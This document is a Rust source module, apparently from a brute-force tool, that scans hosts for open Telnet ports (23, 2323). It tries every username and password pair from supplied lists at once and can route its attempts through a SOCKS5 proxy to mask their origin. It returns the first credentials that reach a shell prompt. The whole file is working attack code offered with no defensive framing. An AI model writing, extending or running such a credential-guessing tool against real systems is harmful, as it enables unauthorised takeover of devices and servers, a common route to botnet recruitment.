// src/telnet.rs

use anyhow::{Context, Result};
use futures::stream::{FuturesUnordered, StreamExt};
use std::{
    io::{Read, Write},
    net::{SocketAddr, ToSocketAddrs, TcpStream},
    sync::Arc,
    time::Duration,
};
use telnet::{Telnet, Event};
use tokio::task;
use socks::Socks5Stream;
use crate::events::BruteEvent;

const TELNET_PORTS: &[u16] = &[23, 2323];
const CONNECT_TIMEOUT_SECS: u64 = 5;
const RETRY_DELAY_MS: u64 = 200;
const MAX_RETRIES: usize = 2;

/// Trait alias for Telnet-compatible streams
trait TelnetStream: Read + Write + Send {}
impl<T: Read + Write + Send> TelnetStream for T {}

/// Brute-force Telnet for a single IP
pub async fn bruteforce_ip(
    ip: String,
    usernames: Arc<Vec<String>>,
    passwords: Arc<Vec<String>>,
    proxy: String,
) -> Vec<BruteEvent> {
    let mut events = Vec::new();
    let mut open_port = None;

    for &port in TELNET_PORTS {
        if is_port_open(&ip, port, &proxy).await {
            open_port = Some(port);
            events.push(BruteEvent::Info(format!("Telnet port {} open on {}", port, ip)));
            break;
        }
    }

    let port = match open_port {
        Some(p) => p,
        None => {
            events.push(BruteEvent::Fail(format!("No open Telnet port on {}", ip)));
            return events;
        }
    };

    let mut tasks = FuturesUnordered::new();

    for username in usernames.iter().cloned() {
        for password in passwords.iter().cloned() {
            let ip = ip.clone();
            let username = username.clone();
            let password = password.clone();
            let proxy = proxy.clone();

            tasks.push(task::spawn_blocking(move || {
                try_login(&ip, port, &username, &password, &proxy)
            }));
        }
    }

    let mut successful = false;

    while let Some(result) = tasks.next().await {
        match result {
            Ok(Ok(success_string)) => {
                let parts: Vec<&str> = success_string.splitn(2, ':').collect();
                events.push(BruteEvent::Success {
                    protocol: "TELNET".to_string(),
                    ip: ip.clone(),
                    username: parts[0].to_string(),
                    password: parts[1].to_string(),
                    port,
                });
                successful = true;
                break; // Stop on first success
            }
            Ok(Err(e)) => events.push(BruteEvent::Error(e.to_string())),
            Err(e) => events.push(BruteEvent::Error(format!("Join error: {}", e))),
        }
    }

    if !successful {
        events.push(BruteEvent::Fail(format!("Telnet brute-force failed on {}", ip)));
    }

    events
}

/// Check if a Telnet port is open
async fn is_port_open(ip: &str, port: u16, proxy: &str) -> bool {
    let ip = ip.to_string();
    let proxy = proxy.to_string();

    task::spawn_blocking(move || {
        connect_via_proxy(&ip, port, &proxy).is_ok()
    })
    .await
    .unwrap_or(false)
}

/// Try a Telnet login
fn try_login(ip: &str, port: u16, username: &str, password: &str, proxy: &str) -> Result<String> {
    const TELNET_BUFFER_SIZE: usize = 256;

    for attempt in 1..=MAX_RETRIES {
        let stream = connect_via_proxy(ip, port, proxy)?;
        let mut connection = Telnet::from_stream(Box::new(stream), TELNET_BUFFER_SIZE);

        let mut username_sent = false;
        let mut password_sent = false;

        loop {
            match connection.read_timeout(Duration::from_secs(CONNECT_TIMEOUT_SECS))? {
                Event::Data(buffer) => {
                    let response = String::from_utf8_lossy(&buffer).to_lowercase();

                    if response.contains("login:") && !username_sent {
                        connection.write(format!("{}\n", username).as_bytes())?;
                        username_sent = true;
                    } else if response.contains("password:") && !password_sent {
                        connection.write(format!("{}\n", password).as_bytes())?;
                        password_sent = true;
                    } else if response.contains(">") || response.contains("#") || response.contains("$") {
                        connection.write(b"exit\n")?;
                        return Ok(format!("{}:{}", username, password));
                    } else if response.contains("incorrect") || response.contains("failed") {
                        return Err(anyhow::anyhow!("Telnet authentication failed"));
                    }
                }
                Event::TimedOut => break,
                _ => continue,
            }
        }

        std::thread::sleep(Duration::from_millis(RETRY_DELAY_MS));
    }

    Err(anyhow::anyhow!("Max retries reached"))
}


/// Establish TCP stream via proxy or direct
fn connect_via_proxy(ip: &str, port: u16, proxy: &str) -> Result<std::net::TcpStream> {
    let target = format!("{}:{}", ip, port);

    if proxy.starts_with("socks5://") {
        let proxy_addr = proxy.trim_start_matches("socks5://");

        let s5 = Socks5Stream::connect(proxy_addr, target.as_str())
            .context("SOCKS5 connect failed")?;

        let std_stream = s5.into_inner();
        std_stream.set_nonblocking(false)
            .context("Failed to set stream blocking mode")?;
        Ok(std_stream)
    } else {
        let addr: SocketAddr = target.to_socket_addrs()?
            .next()
            .context("Invalid address")?;
        Ok(std::net::TcpStream::connect_timeout(&addr, Duration::from_secs(CONNECT_TIMEOUT_SECS))?)
    }
}
